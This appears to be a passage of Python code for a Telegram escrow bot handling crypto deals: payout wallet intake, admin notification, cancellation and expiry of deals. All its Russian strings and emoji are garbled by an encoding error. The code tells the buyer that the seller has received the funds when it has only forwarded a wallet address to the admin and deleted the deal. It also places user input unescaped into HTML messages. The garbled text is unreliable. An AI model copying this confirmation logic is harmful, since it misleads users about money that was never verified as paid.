    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∞–¥—Ä–µ—Å–∞ –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–ø–ª–∞—Ç—ã"""
    data = await state.get_data()
    deal_code = data.get("complete_deal_code")
    deal = active_deals.get(deal_code)
    
    if not deal or message.from_user.id != deal["seller_id"]:
        await message.answer("‚ùå –û—à–∏–±–∫–∞: —Å–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
        await state.clear()
        return
    
    wallet_address = message.text.strip()
    currency = deal["currency"].upper()
    amount = deal["amount"]
    payout_amount = amount * 0.99 # –†–∞—Å—á–µ—Ç —Å—É–º–º—ã –∫ –≤—ã–ø–ª–∞—Ç–µ
    
    admin_message = (
        f"""üîî –ü—Ä–æ–¥–∞–≤–µ—Ü –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª –∞–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–ø–ª–∞—Ç—ã

üìå –ö–æ–¥ —Å–¥–µ–ª–∫–∏: {deal_code}
üíµ –°—É–º–º–∞ —Å–¥–µ–ª–∫–∏: {amount} {currency}
üí∏ –ö –≤—ã–ø–ª–∞—Ç–µ (–∑–∞ –≤—ã—á–µ—Ç–æ–º 1%): {payout_amount:.2f} {currency}
üë§ –ü—Ä–æ–¥–∞–≤–µ—Ü: @{message.from_user.username} (ID: {deal['seller_id']})
üè¶ –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞: <code>{wallet_address}</code>

‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤—ã–ø–æ–ª–Ω–∏—Ç–µ –ø–µ—Ä–µ–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤."""
    )
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=admin_message,
        parse_mode="HTML"
    )
    
    await message.answer(
        f"""üîπ –°—Ä–µ–¥—Å—Ç–≤–∞ –≤ —Ä–∞–∑–º–µ—Ä–µ {payout_amount:.2f} {currency} –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –Ω–∞ –∞–¥—Ä–µ—Å:
<code>{wallet_address}</code>

‚úÖ –í–∞—à –∫–æ—à–µ–ª–µ–∫ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≥–∞—Ä–∞–Ω—Ç—É. –û–∂–∏–¥–∞–π—Ç–µ –ø–æ—Å—Ç—É–ø–ª–µ–Ω–∏—è —Å—Ä–µ–¥—Å—Ç–≤. –°–¥–µ–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.""",
        parse_mode="HTML",
        reply_markup=await get_main_keyboard(),
    )
    
    await bot.send_message(
        chat_id=deal["buyer_id"],
        text="–ü—Ä–æ–¥–∞–≤–µ—Ü –ø–æ–ª—É—á–∏–ª —Å–≤–æ–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞. –°–¥–µ–ª–∫–∞ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≤–µ—Ä—à–µ–Ω–∞!",
        reply_markup=await get_main_keyboard(),
    )
    
    del active_deals[deal_code]
    if deal["buyer_id"] in user_deals: del user_deals[deal["buyer_id"]]
    if deal["seller_id"] in user_deals: del user_deals[deal["seller_id"]]
    
    await state.clear()

@dp.message(Command("cancel"))
async def cmd_cancel(message: types.Message, state: FSMContext):
    """–û—Ç–º–µ–Ω–∞ —Ç–µ–∫—É—â–µ–≥–æ –¥–µ–π—Å—Ç–≤–∏—è"""
    await state.clear()
    await message.answer(
        "–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.",
        reply_markup=await get_main_keyboard(),
    )

async def check_expired_deals():
    """–ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∏ —É–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–æ—Å—Ä–æ—á–µ–Ω–Ω—ã—Ö —Å–¥–µ–ª–æ–∫"""
    while True:
        await asyncio.sleep(60)
        now = datetime.now()
        expired_deals = [code for code, deal in active_deals.items() 
                         if deal["status"] == "created" and deal.get("expires_at") and deal["expires_at"] < now]
        
        for deal_code in expired_deals:
            deal = active_deals.get(deal_code)
            if not deal: continue
            
            try:
                await bot.send_message(
                    chat_id=deal["buyer_id"],
                    text=f"‚ùå –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è —Å–¥–µ–ª–∫–∏ <code>{deal_code}</code> –∏—Å—Ç–µ–∫, –∏ –æ–Ω–∞ –±—ã–ª–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.",
                    parse_mode="HTML",
                    reply_markup=await get_main_keyboard()
                )
            except Exception as e:
                print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–≤–µ–¥–æ–º–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {deal['buyer_id']} –æ –ø—Ä–æ—Å—Ä–æ—á–µ–Ω–Ω–æ–π —Å–¥–µ–ª–∫–µ: {e}")
            
            del active_deals[deal_code]
            if deal["buyer_id"] in user_deals:
                del user_deals[deal["buyer_id"]]

async def main():
    asyncio.create_task(check_expired_deals())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())